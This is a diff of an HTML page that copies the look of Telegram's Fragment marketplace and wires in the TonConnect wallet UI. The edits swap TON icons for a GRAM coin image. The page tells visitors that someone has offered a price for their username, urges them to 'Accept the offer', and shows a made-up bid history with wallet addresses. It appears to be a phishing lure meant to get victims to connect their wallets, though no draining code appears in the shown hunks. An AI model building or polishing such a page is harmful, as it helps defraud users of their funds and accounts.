@@ -8,7 +8,6 @@
     <meta name="format-detection" content="telephone=no">
     <title>Fragment</title>
     
-    <!-- Иконка вкладки (Fragment) -->
     <link rel="shortcut icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'%3E%3Cpath d='M126.3 153.6L252 209.2c3.2 1.5 7.2 1.3 12.2-.9l123.8-54.8c6.6-2.4 2.9-9.8-2.3-9l-256.6-1.1c-7.2.3-9.2 7.5-2.8 10.2zM116.2 182.1l118.4 184c3.7 6 13.1 2.6 12.8-2.8l-.2-126.2c-.1-7.1-1.9-8.7-6.4-10.6l-118.4-52.7c-4.3-2.4-10.1 1.6-6.2 8.3zM267.5 234.8l.3 127c.1 8.5 8.6 10.1 13.5 2.9l102.9-159.4 2.2-3.4 1.9-2.9 10.8-16.6c3.3-5.5-1.9-11.8-9.7-8.1l-117.4 52.9c-.2.1-.4.2-.6.3-1.5.9-2.5 1.8-3 2.9-.7 1.2-.9 2.7-.9 4.5z' fill='%23fff'/%3E%3C/svg%3E" type="image/x-icon">
     
     <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.0/dist/tonconnect-ui.min.js"></script>
@@ -27,6 +26,9 @@
             --btn-primary-bg-color: #248bda;
             --btn-primary-bg-hover-color: #207cc2;
             --def-border-radius: 8px;
+            
+            /* ТВОЯ ССЫЛКА НА ГРАМ */
+            --gram-icon: url('https://coin-images.coingecko.com/coins/images/17980/large/Gram_Circular_Badge.png?1781524778');
         }
         * { box-sizing: border-box; }
         body {
@@ -84,10 +86,10 @@
         .tm-desc b { color: #fff; }
         .tm-desc a { color: var(--accent-color); text-decoration: none; }
         
-        /* Иконка TON в тексте */
-        .ton-icon {
+        /* Иконка GRAM */
+        .gram-icon {
             display: inline-block; width: 16px; height: 16px; vertical-align: text-bottom; margin: 0 4px;
-            background-image: url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"%3E%3Ccircle cx="12" cy="12" r="12" fill="%230098EA"/%3E%3Cpath d="M12 5L15.5 10H20L12 19L4 10H8.5L12 5Z" fill="%23FFFFFF"/%3E%3C/svg%3E');
+            background-image: var(--gram-icon);
             background-size: contain; background-repeat: no-repeat;
         }
 
@@ -120,10 +122,10 @@
         .tm-table td:first-child { color: #fff; font-weight: bold; }
         .tm-table td:last-child { color: var(--accent-color); text-align: right; }
         
-        /* Иконка TON для таблиц */
-        .ton-icon-sm {
+        /* Иконка GRAM для таблиц */
+        .gram-icon-sm {
             display: inline-block; width: 14px; height: 14px; vertical-align: middle; margin-right: 4px;
-            background-image: url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"%3E%3Ccircle cx="12" cy="12" r="12" fill="%230098EA"/%3E%3Cpath d="M12 5L15.5 10H20L12 19L4 10H8.5L12 5Z" fill="%23FFFFFF"/%3E%3C/svg%3E');
+            background-image: var(--gram-icon);
             background-size: contain; background-repeat: no-repeat;
         }
 
@@ -163,7 +165,7 @@
             <div class="tm-box">
                 <div class="tm-desc">
                     <b>What is this?</b><br><br>
-                    Someone offered <span class="ton-icon"></span><b><span id="display-price">0</span></b> for your username. If the price suits you, press "Accept the offer".<br><br>
+                    Someone offered <span class="gram-icon"></span><b><span id="display-price">0</span></b> for your username. If the price suits you, press "Accept the offer".<br><br>
                     <a href="#">How does this work?</a>
                 </div>
 
@@ -216,7 +218,7 @@
                     </thead>
                     <tbody>
                         <tr>
-                            <td><span class="ton-icon-sm"></span><span id="latest-price">0</span></td>
+                            <td><span class="gram-icon-sm"></span><span id="latest-price">0</span></td>
                             <td>23 Nov 2026 at <span id="latest-time">00:00</span></td>
                             <td>UQDm89iC...vEnlMO6e</td>
                         </tr>
@@ -237,7 +239,7 @@
                     </thead>
                     <tbody>
                         <tr>
-                            <td><span class="ton-icon-sm"></span>10</td>
+                            <td><span class="gram-icon-sm"></span>10</td>
                             <td>Nov 21 at 21:39</td>
                             <td>UQCXv...HWJ_4</td>
                         </tr>
